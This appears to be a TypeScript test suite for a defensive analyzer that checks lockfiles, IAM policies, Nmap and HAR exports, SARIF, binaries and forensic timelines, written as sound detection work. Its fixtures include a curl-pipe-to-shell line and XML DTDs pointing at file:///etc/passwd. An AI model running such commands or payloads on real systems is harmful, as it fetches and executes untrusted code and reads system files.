import assert from 'node:assert/strict';
import { test } from 'node:test';
import { analyzeArtifact, ArtifactAnalysisError, ARTIFACT_LIMITS, sha256, type AnalysisKind } from '../src/index.js';

const analyze = (kind: AnalysisKind, body: unknown) => analyzeArtifact({ kind, name: 'fixture.json', mediaType: 'application/json', content: JSON.stringify(body) });
const codes = (report: ReturnType<typeof analyzeArtifact>) => report.findings.map(item => item.ruleId);

test('artifact validation rejects unsupported kinds, fields, size, malformed, duplicate keys and excessive depth', () => {
  const input = { kind: 'dependency' as const, name: 'fixture.json', mediaType: 'application/json', content: '{}' };
  for (const changed of [null, { ...input, kind: 'execute' }, { ...input, command: 'ignored' }, { ...input, name: '\nsecret' }, { ...input, mediaType: 'text/plain; charset=utf8' }, { ...input, content: 'a'.repeat(ARTIFACT_LIMITS.bytes + 1) }, { ...input, content: '{' }, { ...input, content: '{"lockfileVersion":2,"lockfileVersion":3}' }, { ...input, content: '{"x":1,"\\u0078":2}' }, { ...input, content: '['.repeat(60) + '0' + ']'.repeat(60) }]) {
    assert.throws(() => analyzeArtifact(changed as never), ArtifactAnalysisError);
  }
});

test('dependency hygiene is grounded in lock metadata and never emits vulnerability claims', () => {
  const body = { lockfileVersion: 3, packages: { '': {}, 'node_modules/one': { resolved: 'http://example.test/a.tgz', hasInstallScript: true }, 'node_modules/two': { resolved: 'git+https://example.test/repo#main' }, 'local': { link: true } } };
  const report = analyze('dependency', body);
  assert.deepEqual(codes(report), ['DEP-INSTALL-001', 'DEP-TRANSPORT-001', 'DEP-INTEGRITY-001', 'DEP-GIT-001']);
  assert.equal(report.input.sha256, sha256(JSON.stringify(body)));
  assert.equal(report.facts.find(item => item.label === 'Links locais não resolvidos')?.value, 1);
  assert.ok(report.limitations.some(item => item.includes('Não consulta CVEs')));
  assert.ok(report.findings.every(item => /^[a-f0-9]{64}$/.test(item.evidenceHash)));
  assert.deepEqual(report, analyze('dependency', body));
});

test('good dependency metadata and CycloneDX hashes avoid hygiene findings', () => {
  assert.deepEqual(codes(analyze('dependency', { lockfileVersion: 2, packages: { 'node_modules/ok': { resolved: 'https://example.test/ok.tgz', integrity: 'sha512-' + Buffer.alloc(64).toString('base64') } } })), []);
  const report = analyze('dependency', { bomFormat: 'CycloneDX', specVersion: '1.6', components: [{ name: 'ok', type: 'library', version: '1.0.0', hashes: [{ alg: 'SHA-256', content: 'a'.repeat(64) }] }] });
  assert.equal(report.findings.length, 0);
  assert.throws(() => analyze('dependency', { lockfileVersion: 1, dependencies: {} }), ArtifactAnalysisError);
});

test('IAM findings distinguish broad declarations, conditions and explicit deny', () => {
  const report = analyze('cloud', { Statement: [
    { Effect: 'Allow', Action: '*', Resource: '*', Principal: '*' },
    { Effect: 'Deny', Action: '*', Resource: '*', Principal: '*' },
    { Effect: 'Allow', Action: 'sts:AssumeRole', Principal: '*', Condition: { StringEquals: { 'aws:PrincipalOrgID': 'o-example' } } },
    { Effect: 'Allow', Action: 'ec2:DescribeInstances', Resource: '*' },
  ] });
  assert.deepEqual(codes(report), ['IAM-ADMIN-001', 'IAM-PUBLIC-001', 'IAM-PUBLIC-001']);
  assert.equal(report.findings.at(-1)?.severity, 'medium');
  assert.ok(report.findings.every(item => !item.location.includes('/1')));
  assert.ok(report.limitations.some(item => item.includes('Não calcula permissões efetivas')));
});

test('S3 blocked controls require explicit booleans and do not infer actual public access', () => {
  const report = analyze('cloud', { PublicAccessBlockConfiguration: { BlockPublicAcls: true, IgnorePublicAcls: true, BlockPublicPolicy: false, RestrictPublicBuckets: true } });
  assert.equal(report.findings.length, 1);
  assert.match(report.findings[0].recommendation, /não demonstra/);
  assert.throws(() => analyze('cloud', { PublicAccessBlockConfiguration: { BlockPublicAcls: 'true' } }), ArtifactAnalysisError);
  assert.throws(() => analyze('cloud', { Statement: [{ Effect: 'Allow', Action: '*', NotAction: 'iam:*', Resource: '*' }] }), ArtifactAnalysisError);
});

test('identity export uses observed UTC time, skips inactive accounts and rejects ambiguous dates', () => {
  const report = analyze('identity', { format: 'sentinel.identity.v1', observedAt: '2026-10-24T00:00:00Z', accounts: [
    { id: 'a-secret-user', enabled: true, privileged: true, mfaEnabled: false, lastLoginAt: '2026-01-01T00:00:00Z' },
    { id: 'inactive', enabled: false, privileged: true, mfaEnabled: false },
  ] });
  assert.deepEqual(codes(report), ['IDENTITY-MFA-001', 'IDENTITY-DORMANT-001']);
  assert.equal(JSON.stringify(report).includes('a-secret-user'), false);
  assert.throws(() => analyze('identity', { format: 'sentinel.identity.v1', observedAt: '2026-02-30T00:00:00Z', accounts: [] }), ArtifactAnalysisError);
  assert.throws(() => analyze('identity', { format: 'sentinel.identity.v1', observedAt: '2026-01-01T00:00:00Z', accounts: [{ id: 'a', enabled: true, privileged: false, mfaEnabled: true, lastLoginAt: '2027-01-01T00:00:00Z' }] }), ArtifactAnalysisError);
});

test('AI export checks executor boundaries and redacts literal credentials', () => {
  const report = analyze('ai', { format: 'sentinel.ai.v1', tools: [{ name: 'unsafe', enabled: true, requiresApproval: false, capabilities: ['execute', 'network'], allowedHosts: ['*'] }, { name: 'disabled', enabled: false, requiresApproval: false, capabilities: ['execute'] }], dataRetention: { storesPrompts: true, redactionEnabled: false }, credentials: { key: 'DO_NOT_LEAK_THIS_SECRET', configured: 'env:API_KEY' } });
  assert.deepEqual(codes(report), ['AI-ACTION-001', 'AI-EGRESS-001', 'AI-RETENTION-001', 'AI-CREDENTIAL-001']);
  assert.equal(JSON.stringify(report).includes('DO_NOT_LEAK_THIS_SECRET'), false);
  assert.throws(() => analyze('ai', { format: 'sentinel.ai.v1', tools: [], dataRetention: { storesPrompts: false, redactionEnabled: 'false' } }), ArtifactAnalysisError);
});

const nmap = '<nmaprun scanner="nmap"><host><status state="up"/><ports><port protocol="tcp" portid="23"><state state="open"/><service name="telnet" method="probed" conf="10"/></port><port protocol="tcp" portid="22"><state state="closed"/></port></ports></host></nmaprun>';
test('Nmap imports real root declaration, identifies open services and labels imported provenance', () => {
  const report = analyzeArtifact({ kind: 'network', name: 'nmap.xml', mediaType: 'application/xml', content: '<?xml version="1.0"?><!DOCTYPE nmaprun>' + nmap });
  assert.deepEqual(codes(report), ['NET-OPEN-001', 'NET-PLAINTEXT-001']);
  assert.ok(report.findings.every(item => item.provenance === 'imported_tool'));
  assert.equal(report.facts.find(item => item.label === 'Portas declaradas abertas')?.value, 1);
});

test('Nmap rejects external and internal DTDs, unknown entities, malformed roots and ports', () => {
  for (const content of [
    '<!DOCTYPE nmaprun SYSTEM "file:///etc/passwd">' + nmap,
    '<!DOCTYPE nmaprun [<!ENTITY x "text">]>' + nmap,
    nmap.replace('state="up"', 'state="&x;"'),
    nmap.replace('portid="23"', 'portid="99999"'),
    nmap.replace('</nmaprun>', ''),
    '<html/>',
  ]) assert.throws(() => analyzeArtifact({ kind: 'network', name: 'bad.xml', mediaType: 'application/xml', content }), ArtifactAnalysisError);
});

function har(url: string, requestHeaders: { name: string; value: string }[] = [], responseHeaders: { name: string; value: string }[] = []) {
  return { log: { version: '1.2', entries: [{ request: { method: 'GET', url, headers: requestHeaders, cookies: [] }, response: { status: 200, headers: responseHeaders } }] } };
}
test('HAR finds HTTP credential exposure, query secrets and CORS without disclosing values', () => {
  const report = analyze('network', har('http://private.example.test/?token=MY_QUERY_SECRET', [{ name: 'Authorization', value: 'Bearer MY_HEADER_SECRET' }], [{ name: 'Access-Control-Allow-Origin', value: ' * ' }, { name: 'Access-Control-Allow-Credentials', value: 'true' }]));
  assert.deepEqual(codes(report), ['NET-HTTP-001', 'NET-HAR-SECRET-001', 'NET-QUERY-001', 'NET-CORS-001']);
  assert.equal(report.findings[0].severity, 'high');
  for (const secret of ['MY_QUERY_SECRET', 'MY_HEADER_SECRET', 'private.example.test']) assert.equal(JSON.stringify(report).includes(secret), false);
});

test('HAR secure cookies avoid findings and missing Secure is identified', () => {
  assert.equal(analyze('network', har('https://example.test/', [], [{ name: 'Set-Cookie', value: 'session=PRIVATE; Secure; HttpOnly' }])).findings.length, 0);
  assert.deepEqual(codes(analyze('network', har('https://example.test/', [], [{ name: 'Set-Cookie', value: 'session=PRIVATE; HttpOnly' }]))), ['NET-COOKIE-001']);
  assert.throws(() => analyze('network', har('file:///etc/passwd')), ArtifactAnalysisError);
});

test('SARIF respects default level, skips pass/suppressed, preserves imported provenance and redacts messages', () => {
  const report = analyze('dependency', { version: '2.1.0', runs: [{ tool: { driver: { name: 'Analyzer', rules: [{ id: 'x', defaultConfiguration: { level: 'error' } }] } }, results: [
    { ruleId: 'x', message: { text: 'DO_NOT_LEAK' } }, { kind: 'pass', message: { text: 'ok' } },
    { suppressions: [{ status: 'accepted' }], message: { text: 'suppressed' } }, { kind: 'review', level: 'error', message: { text: 'review' } },
  ] }] });
  assert.equal(report.findings.length, 2);
  assert.equal(report.findings[0].severity, 'high'); assert.equal(report.findings[1].severity, 'info');
  assert.equal(JSON.stringify(report).includes('DO_NOT_LEAK'), false);
  assert.ok(report.findings.every(item => item.provenance === 'imported_tool'));
});

test('binary triage hashes bytes, reads ELF metadata and rejects bad envelopes', () => {
  const bytes = Buffer.alloc(64); bytes.write('7f454c4602010100', 0, 'hex'); bytes.writeUInt16LE(62, 18);
  const report = analyze('malware', { format: 'sentinel.binary.v1', encoding: 'base64', data: bytes.toString('base64') });
  assert.equal(report.facts.find(item => item.label === 'SHA-256 do binário decodificado')?.value, sha256(bytes));
  assert.equal(report.facts.find(item => item.label === 'Formato identificado')?.value, 'ELF64');
  assert.equal(report.findings.length, 0);
  for (const data of ['', 'A===', 'Zg=', 'Zh==']) assert.throws(() => analyze('malware', { format: 'sentinel.binary.v1', encoding: 'base64', data }), ArtifactAnalysisError);
});

test('PE triage validates section bounds and identifies writable executable declarations', () => {
  const bytes = Buffer.alloc(168); bytes.write('MZ'); bytes.writeUInt32LE(64, 60); bytes.write('PE\0\0', 64); bytes.writeUInt16LE(0x8664, 68); bytes.writeUInt16LE(1, 70); bytes.writeUInt16LE(0, 84);
  bytes.writeUInt32LE(40, 104); bytes.writeUInt32LE(128, 108); bytes.writeUInt32LE(0xa0000000, 124);
  const envelope = () => ({ format: 'sentinel.binary.v1', encoding: 'base64', data: bytes.toString('base64') });
  assert.deepEqual(codes(analyze('malware', envelope())), ['MAL-PE-WX-001']);
  bytes.writeUInt32LE(500, 104);
  assert.throws(() => analyze('malware', envelope()), ArtifactAnalysisError);
});

test('script triage never includes the original command and recognizes only documented patterns', () => {
  const report = analyzeArtifact({ kind: 'malware', name: 'script.txt', mediaType: 'text/plain', content: 'curl https://private.example.test/install | sh\nconsole.log("ordinary");' });
  assert.deepEqual(codes(report), ['MAL-SCRIPT-PIPE-001']);
  assert.equal(JSON.stringify(report).includes('private.example.test'), false);
  assert.equal(analyzeArtifact({ kind: 'malware', name: 'safe.js', mediaType: 'text/plain', content: '{ console.log("ok"); }' }).findings.length, 0);
});

test('forensic timeline is stable, retains duplicates, hashes full evidence and omits messages', () => {
  const first = { occurredAt: '2026-10-23T10:00:00Z', eventType: 'file.write', source: 'host-export', message: 'PRIVATE_MESSAGE' };
  const later = { occurredAt: '2026-10-23T11:00:00Z', eventType: 'user.login', source: 'auth-export' };
  const report = analyze('forensic', { format: 'sentinel.timeline.v1', events: [later, first, first] });
  assert.equal(report.timeline?.length, 3);
  assert.equal(report.timeline?.[0].evidenceHash, sha256(JSON.stringify(first)));
  assert.equal(report.timeline?.[2].eventType, 'user.login');
  assert.equal(JSON.stringify(report).includes('PRIVATE_MESSAGE'), false);
  assert.equal(report.facts.find(item => item.label === 'Eventos idênticos repetidos')?.value, 1);
});

test('excess findings cause explicit rejection instead of silently dropping evidence', () => {
  const accounts = Array.from({ length: ARTIFACT_LIMITS.findings + 1 }, (_, index) => ({ id: String(index), enabled: true, privileged: false, mfaEnabled: false }));
  assert.throws(() => analyze('identity', { format: 'sentinel.identity.v1', observedAt: '2026-10-24T00:00:00Z', accounts }), /divida o artefato/);
});
